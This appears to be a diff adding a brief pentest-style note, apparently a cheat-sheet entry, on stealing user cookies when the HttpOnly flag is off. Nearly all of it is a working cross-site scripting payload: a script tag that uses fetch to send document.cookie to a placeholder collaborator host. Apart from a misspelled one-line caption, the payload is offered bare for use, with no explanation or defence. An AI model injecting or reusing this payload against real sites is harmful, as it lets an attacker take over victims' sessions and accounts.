@@ -1,0 +1,5 @@
+To slove user cookies if the httponly = false
+  
+<script>
+fetch('https://YOUR-COLLABORATOR-ID/?c='+document.cookie)
+</script>
